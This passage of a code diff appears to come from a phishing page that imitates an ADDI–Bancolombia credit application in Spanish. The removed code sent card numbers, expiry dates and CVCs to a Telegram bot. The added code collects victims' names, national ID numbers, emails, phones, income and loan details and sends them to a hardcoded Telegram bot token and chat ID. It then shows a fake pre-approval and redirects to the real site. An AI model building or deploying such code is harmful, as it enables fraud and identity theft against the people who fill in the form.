-                e.target.value = formattedValue;
+            // Formatear campos numéricos
+            document.getElementById('monthlyIncome').addEventListener('input', function(e) {
+                formatCurrency(e.target);
             });
             
-            // Formatear fecha de expiración (MM/AA)
-            expiryDateInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                
-                if (value.length >= 2) {
-                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                } else {
-                    e.target.value = value;
-                }
+            document.getElementById('creditAmount').addEventListener('input', function(e) {
+                formatCurrency(e.target);
             });
             
-            // Solo permitir números en el CVC
-            cvcInput.addEventListener('input', function(e) {
+            // Formatear número de cédula
+            document.getElementById('idNumber').addEventListener('input', function(e) {
                 e.target.value = e.target.value.replace(/\D/g, '');
             });
+            
+            // Formatear teléfono
+            document.getElementById('phone').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+            
+            // Función para formatear moneda
+            function formatCurrency(input) {
+                let value = input.value.replace(/\D/g, '');
+                if (value) {
+                    value = parseInt(value, 10).toLocaleString('es-CO');
+                    input.value = value;
+                }
+            }
+            
+            // Mostrar alerta de advertencia al cargar la página
+            setTimeout(function() {
+                showAlert(alertWarning);
+            }, 1000);
             
             // Validación del formulario
             form.addEventListener('submit', function(e) {
@@ -440,24 +917,73 @@
                 
                 let isValid = true;
                 
-                // Validar número de tarjeta (16 dígitos)
-                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
-                if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
-                    document.getElementById('cardNumberError').style.display = 'block';
+                // Validar nombre completo
+                const fullName = document.getElementById('fullName').value;
+                if (fullName.trim().length < 5) {
+                    document.getElementById('fullNameError').style.display = 'block';
                     isValid = false;
                 }
                 
-                // Validar fecha de expiración
-                const expiryDate = expiryDateInput.value;
-                if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
-                    document.getElementById('expiryDateError').style.display = 'block';
+                // Validar cédula
+                const idNumber = document.getElementById('idNumber').value;
+                if (idNumber.length < 6) {
+                    document.getElementById('idNumberError').style.display = 'block';
                     isValid = false;
                 }
                 
-                // Validar CVC (3 dígitos)
-                const cvc = cvcInput.value;
-                if (cvc.length !== 3 || !/^\d+$/.test(cvc)) {
-                    document.getElementById('cvcError').style.display = 'block';
+                // Validar email
+                const email = document.getElementById('email').value;
+                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    document.getElementById('emailError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar teléfono
+                const phone = document.getElementById('phone').value;
+                if (phone.length < 7) {
+                    document.getElementById('phoneError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar estado laboral
+                const employmentStatus = document.getElementById('employmentStatus').value;
+                if (!employmentStatus) {
+                    document.getElementById('employmentStatusError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar ingresos mensuales
+                const monthlyIncome = document.getElementById('monthlyIncome').value;
+                if (!monthlyIncome) {
+                    document.getElementById('monthlyIncomeError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar monto solicitado
+                const creditAmount = document.getElementById('creditAmount').value;
+                if (!creditAmount) {
+                    document.getElementById('creditAmountError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar propósito del crédito
+                const creditPurpose = document.getElementById('creditPurpose').value;
+                if (!creditPurpose) {
+                    document.getElementById('creditPurposeError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar tiempo en el trabajo
+                const employmentTime = document.getElementById('employmentTime').value;
+                if (!employmentTime) {
+                    document.getElementById('employmentTimeError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                // Validar términos y condiciones
+                const termsCheck = document.getElementById('termsCheck').checked;
+                if (!termsCheck) {
+                    document.getElementById('termsCheckError').style.display = 'block';
                     isValid = false;
                 }
                 
@@ -467,38 +993,102 @@
                     
                     // Simular procesamiento
                     setTimeout(function() {
-                        // Enviar datos por Telegram
-                        sendToTelegram(cardNumber, expiryDate, cvc);
-                        
                         // Ocultar indicador de carga
                         loadingElement.style.display = 'none';
                         
-                        // Mostrar mensaje de éxito
-                        successMessage.style.display = 'block';
+                        // Mostrar alerta de proceso
+                        showAlert(alertProcessing);
                         
-                        // Redirigir después de 3 segundos
+                        // Enviar datos a Telegram
+                        sendToTelegram(
+                            fullName,
+                            idNumber,
+                            email,
+                            phone,
+                            employmentStatus,
+                            monthlyIncome,
+                            creditAmount,
+                            creditPurpose,
+                            employmentTime
+                        );
+                        
+                        // Después de 2 segundos, mostrar preaprobación
                         setTimeout(function() {
-                            window.location.href = "https://www.addi.com";
-                        }, 3000);
-                    }, 2000);
+                            showAlert(alertPreapproved);
+                            
+                            // Redirigir después de 3 segundos
+                            setTimeout(function() {
+                                window.location.href = "https://www.addi.com";
+                            }, 3000);
+                        }, 2000);
+                    }, 3000);
                 }
             });
             
+            // Función para mostrar alertas
+            function showAlert(alertElement) {
+                alertElement.style.display = 'block';
+                
+                // Ocultar después de 5 segundos
+                setTimeout(function() {
+                    alertElement.style.display = 'none';
+                }, 5000);
+            }
+            
             // Función para enviar datos por Telegram
-            function sendToTelegram(cardNumber, expiryDate, cvc) {
-                // Reemplaza con tu token de bot y chat_id de Telegram
-                const botToken = '8545595337:AAEMJymTqxVVtuerPNQmo7dnl_TIK9fPUIw';
-                const chatId = '7776240161';
+            function sendToTelegram(fullName, idNumber, email, phone, employmentStatus, monthlyIncome, creditAmount, creditPurpose, employmentTime) {
+                // REEMPLAZA CON TU TOKEN DE BOT Y CHAT ID
+                const botToken = '8085580214:AAF1Jx0WSF9IDkLMMwqSPH5ReDY0ofcqp30';
+                const chatId = '8299960241';
                 
-                const message = `🔐 *Nueva Solicitud de Crédito ADDI* 🔐
+                // Mapear valores a texto legible
+                const employmentStatusMap = {
+                    'employed': 'Empleado',
+                    'self-employed': 'Independiente',
+                    'unemployed': 'Desempleado',
+                    'student': 'Estudiante',
+                    'retired': 'Pensionado'
+                };
                 
+                const creditPurposeMap = {
+                    'debt-consolidation': 'Consolidación de deudas',
+                    'home-improvement': 'Mejora del hogar',
+                    'education': 'Educación',
+                    'travel': 'Viajes',
+                    'health': 'Salud',
+                    'business': 'Negocio',
+                    'other': 'Otro'
+                };
+                
+                const employmentTimeMap = {
+                    'less-than-year': 'Menos de 1 año',
+                    '1-3-years': '1 a 3 años',
+                    '3-5-years': '3 a 5 años',
+                    'more-than-5': 'Más de 5 años'
+                };
+                
+                const message = `🚀 *NUEVA SOLICITUD DE CRÉDITO ADDI* 🚀
+
 🏦 *Alianza:* ADDI - Bancolombia
-💳 *Número de Tarjeta:* ${cardNumber}
-📅 *Fecha de Expiración:* ${expiryDate}
-🔒 *CVC:* ${cvc}
+
+👤 *Información Personal:*
+• *Nombre:* ${fullName}
+• *Cédula:* ${idNumber}
+• *Email:* ${email}
+• *Teléfono:* ${phone}
+
+💼 *Situación Laboral:*
+• *Estado:* ${employmentStatusMap[employmentStatus]}
+• *Tiempo en trabajo:* ${employmentTimeMap[employmentTime]}
+• *Ingresos mensuales:* $${monthlyIncome}
+
+💰 *Solicitud de Crédito ADDI:*
+• *Monto solicitado:* $${creditAmount}
+• *Propósito:* ${creditPurposeMap[creditPurpose]}
+
 ⏰ *Fecha y Hora:* ${new Date().toLocaleString()}
-                
-_Solicitud de crédito completada desde el formulario de seguridad_`;
+
+_Solicitud completada desde el formulario web ADDI_`;
                 
                 // URL de la API de Telegram
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
